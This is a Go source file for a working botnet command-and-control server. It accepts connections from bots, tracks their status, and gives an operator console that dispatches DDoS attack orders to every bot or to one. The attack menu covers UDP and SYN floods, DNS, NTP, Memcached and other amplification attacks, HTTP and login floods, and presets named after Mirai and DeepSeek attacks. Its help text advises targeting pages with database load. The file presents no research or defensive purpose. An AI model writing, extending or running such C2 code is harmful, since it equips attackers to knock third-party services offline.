package main

import (
	"bufio"
	"fmt"
	"net"
	"os"
	"strings"
	"sync"
	"time"
	
	"github.com/chzyer/readline"
)

type BotInfo struct {
	Conn           net.Conn
	ConnectTime    time.Time
	LastActive     time.Time
	DisconnectTime time.Time
	Status         string
	CurrentTask    string
}

var (
	bots  = make(map[string]*BotInfo)
	botMu sync.Mutex
)

func main() {
	showBanner()
	go startC2Server()
	handleUserInput()
}

func showBanner() {
	fmt.Println(`
  ____ ____   ___   ___   ___  
 / ___|___ \ / _ \ / _ \ / _ \ 
| |     __) | | | | | | | | | |
| |___ / __/| |_| | |_| | |_| |
 \____|_____|\___/ \___/ \___/  v2.1`)

	fmt.Println("\nC2 Control Center Initialized")
	fmt.Println("Type 'help' to see available commands")
}

func startC2Server() {
	listener, err := net.Listen("tcp", ":80")
	if err != nil {
		fmt.Println("C2 server startup failed:", err)
		os.Exit(1)
	}
	defer listener.Close()

	fmt.Println("\n[+] C2 server listening on 0.0.0.0:80")
	for {
		conn, err := listener.Accept()
		if err != nil {
			fmt.Println("Connection error:", err)
			continue
		}
		go handleNewBot(conn)
	}
}

func handleNewBot(conn net.Conn) {
	botIP := conn.RemoteAddr().(*net.TCPAddr).IP.String()
	now := time.Now()

	bot := &BotInfo{
		Conn:        conn,
		ConnectTime: now,
		LastActive:  now,
		Status:      "Online",
	}

	botMu.Lock()
	bots[botIP] = bot
	botMu.Unlock()

	logConnection(botIP)
	fmt.Printf("[+] New bot connected: %s\n", botIP)

	go monitorBotConnection(bot, botIP)
}

func monitorBotConnection(bot *BotInfo, botIP string) {
	defer func() {
		bot.Conn.Close()
		botMu.Lock()
		bot.Status = "Offline"
		bot.DisconnectTime = time.Now()
		botMu.Unlock()
		fmt.Printf("[!] Bot disconnected: %s\n", botIP)
	}()

	reader := bufio.NewReader(bot.Conn)
	for {
		msg, err := reader.ReadString('\n')
		if err != nil {
			return
		}

		botMu.Lock()
		bot.LastActive = time.Now()
		processBotMessage(bot, msg)
		botMu.Unlock()

		fmt.Printf("[%s] Status update: %s", botIP, msg)
	}
}

func processBotMessage(bot *BotInfo, msg string) {
	msg = strings.TrimSpace(msg)
	switch {
	case msg == "TASK_COMPLETE":
		bot.Status = "Online"
		bot.CurrentTask = ""
	case msg == "STOP":
		bot.Status = "Idle"
		bot.CurrentTask = ""
	case strings.HasPrefix(msg, "TASK_PROGRESS "):
		bot.CurrentTask = strings.TrimPrefix(msg, "TASK_PROGRESS ")
	}
}

func logConnection(ip string) {
	file, err := os.OpenFile("bots.log", os.O_APPEND|os.O_WRONLY|os.O_CREATE, 0644)
	if err != nil {
		return
	}
	defer file.Close()
	file.WriteString(fmt.Sprintf("[%s] %s\n", time.Now().Format(time.RFC3339), ip))
}

func handleUserInput() {
	// Create readline instance with command history support
	rl, err := readline.NewEx(&readline.Config{
		Prompt:          "C2> ",
		HistoryFile:     ".c2_history", // Save history to file
		InterruptPrompt: "^C",
		EOFPrompt:       "exit",
	})
	if err != nil {
		fmt.Println("Failed to initialize command line:", err)
		os.Exit(1)
	}
	defer rl.Close()

	// Set up auto-completion
	rl.Config.AutoComplete = readline.NewPrefixCompleter(
		readline.PcItem("attack",
			readline.PcItem("UDP"),
			readline.PcItem("SYN"),
			readline.PcItem("DNS"),
			readline.PcItem("NTP"),
			readline.PcItem("CLDAP"),
			readline.PcItem("RDP"),
			readline.PcItem("SSDP"),
			readline.PcItem("SNMP"),
			readline.PcItem("CHARGEN"),
			readline.PcItem("OPENVPN"),
			readline.PcItem("MEMCACHED"),
			readline.PcItem("DNSBOMB"),
			readline.PcItem("DNSBOOMERANG"),
			readline.PcItem("GET"),
			readline.PcItem("COOKIE"),
			readline.PcItem("POST"),
			readline.PcItem("LOGIN"),
			readline.PcItem("DEEPSEEK_1"),
			readline.PcItem("DEEPSEEK_2"),
			readline.PcItem("MIRAI_1"),
			readline.PcItem("MIRAI_2"),
		),
		readline.PcItem("list"),
		readline.PcItem("info"),
		readline.PcItem("clear"),
		readline.PcItem("help"),
		readline.PcItem("stop"),
		readline.PcItem("exit"),
	)

	for {
		line, err := rl.Readline()
		if err != nil { // io.EOF, readline.ErrInterrupt
			if err == readline.ErrInterrupt {
				continue // Handle Ctrl+C
			}
			break
		}

		input := strings.TrimSpace(line)
		if input == "" {
			continue
		}

		args := strings.Fields(input)
		if len(args) == 0 {
			continue
		}

		command := strings.ToLower(args[0])

		switch command {
		case "attack":
			handleAttackCommand(args[1:])
		case "list":
			showBotList()
		case "info":
			showBotInfo(args[1:])
		case "clear":
			clearScreen()
			rl.SetPrompt("C2> ") // Reset prompt after clearing screen
		case "help":
			showHelp()
		case "stop":
			handleStopCommand(args[1:])
		case "exit":
			cleanExit()
		default:
			fmt.Println("[!] Unknown command. Type 'help' to see available commands")
		}
	}
}

func handleAttackCommand(args []string) {
	if len(args) < 3 {
		fmt.Println("[!] Usage: attack <method> <target IP> <port> [optional params] [bot IP]")
		fmt.Println("Available methods: UDP, SYN, DNS, NTP, CLDAP, RDP, SSDP, SNMP, CHARGEN, OPENVPN, MEMCACHED, DNSBomb, DNSBoomerang, GET, COOKIE, POST, LOGIN, DEEPSEEK_1, DEEPSEEK_2, MIRAI_1, MIRAI_2")
		return
	}

	method := strings.ToUpper(args[0])
	target := args[1]
	port := args[2]
	
	// Define HTTP-related attack methods that require path parameter
	httpMethods := map[string]bool{
		"GET":        true,
		"COOKIE":     true,
		"POST":       true,
		"LOGIN":      true,
		"DEEPSEEK_2": true,
	}

	// Handle optional parameters
	param4 := ""
	var botIP string

	// Processing logic for the fourth parameter depends on attack method
	if len(args) > 3 {
		// For HTTP attacks, the fourth parameter is the path
		if httpMethods[method] {
			param4 = args[3]
			// If there's a fifth parameter, it's the bot IP
			if len(args) > 4 {
				botIP = args[4]
			}
		} else {
			// For non-HTTP attacks, check if the fourth parameter is an IP address
			if net.ParseIP(args[3]) != nil {
				botIP = args[3]
			} else {
				// Not an IP address, treat as attack parameter
				param4 = args[3]
			}
			// If there's a fifth parameter, it must be a bot IP
			if len(args) > 4 {
				botIP = args[4]
			}
		}
	}

	validMethods := map[string]bool{
		"UDP":          true,
		"SYN":          true,
		"DNS":          true,
		"NTP":          true,
		"CLDAP":        true,
		"RDP":          true,
		"SSDP":         true,
		"SNMP":         true,
		"CHARGEN":      true,
		"OPENVPN":      true,
		"MEMCACHED":    true,
		"DNSBOMB":      true,
		"DNSBOOMERANG": true,
		"GET":          true,
		"COOKIE":       true,
		"POST":         true,
		"LOGIN":        true,
		"DEEPSEEK_1":   true,
		"DEEPSEEK_2":   true,
		"MIRAI_1":      true,
		"MIRAI_2":      true,
	}

	if !validMethods[method] {
		fmt.Println("[!] Invalid attack method")
		return
	}

	// Build command string, ensure uppercase
	command := fmt.Sprintf("%s %s %s %s", method, target, port, param4)
	sendBotCommand(command, botIP)
}

func sendBotCommand(command, botIP string) {
	botMu.Lock()
	defer botMu.Unlock()

	sent := 0
	if botIP != "" {
		if bot, exists := bots[botIP]; exists && bot.Status == "Online" {
			// Send command directly, no longer sending STOP first
			if sendCommandToBot(bot, command) {
				bot.Status = "Online"
				bot.CurrentTask = command
				sent++
			}
		} else {
			fmt.Printf("[!] Specified bot unavailable: %s\n", botIP)
			return
		}
	} else {
		for _, bot := range bots {
			if bot.Status == "Online" {
				// Send command directly, no longer sending STOP first
				if sendCommandToBot(bot, command) {
					bot.CurrentTask = command
					sent++
				}
			}
		}
	}

	fmt.Printf("\n[+] Successfully sent command to %d bots\n", sent)
}

func sendCommandToBot(bot *BotInfo, command string) bool {
	_, err := fmt.Fprintf(bot.Conn, "%s\n", command)
	if err != nil {
		bot.Status = "Offline"
		return false
	}
	return true
}

func showBotList() {
	botMu.Lock()
	defer botMu.Unlock()

	fmt.Println("\nActive Bot List:")
	fmt.Printf("%-18s %-22s %-22s %-8s %s\n",
		"IP Address", "Connect Time", "Last Active", "Status", "Current Task")

	for ip, bot := range bots {
		status := ""
		switch bot.Status {
		case "Online":
			status = "\033[32mOnline\033[0m"
		case "Offline":
			status = "\033[31mOffline\033[0m"
		default:
			status = bot.Status
		}

		task := bot.CurrentTask
		if task == "" {
			task = "Idle"
		}

		fmt.Printf("%-18s %-22s %-22s %-8s %s\n",
			ip,
			bot.ConnectTime.Format("2006-01-02 15:04:05"),
			bot.LastActive.Format("2006-01-02 15:04:05"),
			status,
			task)
	}
}

func clearScreen() {
	fmt.Print("\033[H\033[2J")
}

func showHelp() {
	fmt.Println(`
Available Commands:
  attack <method> <target IP> <port> [optional params] [bot IP] - Launch attack
  list                                                         - List all bots
  info <bot IP>                                                - Show bot details
  clear                                                        - Clear screen
  help                                                         - Show help
  stop                                                         - Stop specified/all bots
  exit                                                         - Exit program

Attack Methods:
  UDP           - UDP flood attack
  SYN           - TCP SYN flood
  DNS           - DNS amplification attack
  NTP           - NTP attack
  CLDAP         - CLDAP attack
  RDP           - RDP attack
  SSDP          - SSDP attack
  SNMP          - SNMP attack
  CHARGEN       - CHARGEN attack
  OPENVPN       - OPENVPN attack
  MEMCACHED     - MEMCACHED attack
  DNSBOMB       - Pulse DoS attack from 2024 IEEE S&P paper
  DNSBOOMERANG  - Pulse DNS attack
  GET           - HTTP GET request, requires attack path, recommended for pages with DB interaction
  COOKIE        - HTTP GET with massive Cookie requests, requires attack path
  POST          - HTTP POST flood attack, requires attack path, default request body
  LOGIN         - HTTP POST with massive login requests, requires attack path
  DEEPSEEK_1    - DeepSeek phase 1 attack
  DEEPSEEK_2    - DeepSeek phase 2 attack
  MIRAI_1       - Mirai simulated attack on Kerbs
  MIRAI_2       - Mirai simulated attack on Dyn

Examples:
  attack UDP 192.168.1.100 80
  attack SYN 10.0.0.5 443 192.168.2.15
  attack GET 10.100.0.150 80 /history.html
  attack POST 10.100.0.150 80 /login.php
  stop 10.0.0.1                           - Stop specified bot
  stop                                    - Stop all bots`)
}

func cleanExit() {
	fmt.Println("\n[!] Disconnecting all bots...")
	botMu.Lock()
	for _, bot := range bots {
		bot.Conn.Close()
	}
	botMu.Unlock()
	os.Exit(0)
}

func showBotInfo(args []string) {
	if len(args) == 0 {
		fmt.Println("[!] Please specify bot IP")
		return
	}

	botIP := args[0]
	botMu.Lock()
	defer botMu.Unlock()

	if bot, exists := bots[botIP]; exists {
		fmt.Printf("\nBot Details - %s\n", botIP)
		fmt.Println("--------------------------------------")
		fmt.Printf("Status:       %s\n", bot.Status)
		fmt.Printf("Connect Time: %s\n", bot.ConnectTime.Format("2006-01-02 15:04:05"))
		fmt.Printf("Last Active:  %s\n", bot.LastActive.Format("2006-01-02 15:04:05"))
		if bot.Status == "Offline" {
			fmt.Printf("Disconnect:   %s\n", bot.DisconnectTime.Format("2006-01-02 15:04:05"))
		}
		fmt.Printf("Current Task: %s\n", bot.CurrentTask)
		fmt.Printf("Connection:   %v\n", bot.Conn)
		fmt.Println("--------------------------------------")
	} else {
		fmt.Println("[!] Specified bot not found")
	}
}

func handleStopCommand(args []string) {
	if len(args) == 0 {
		sendStopToAllBots()
	} else {
		ip := args[0]
		sendStopToSpecificBot(ip)
	}
}

func sendStopToAllBots() {
	botMu.Lock()
	defer botMu.Unlock()

	sentCount := 0
	for _, bot := range bots {
		if bot.Status == "Online" {
			sendCommandToBot(bot, "STOP")
			sentCount++
		}
	}
	fmt.Printf("[+] Sent stop command to %d online bots\n", sentCount)
}

func sendStopToSpecificBot(ip string) {
	botMu.Lock()
	defer botMu.Unlock()

	if bot, exists := bots[ip]; exists && bot.Status == "Online" {
		sendCommandToBot(bot, "STOP")
		fmt.Printf("[+] Sent stop command to %s\n", ip)
	} else {
		fmt.Printf("[!] %s is not online or doesn't exist\n", ip)
	}
}
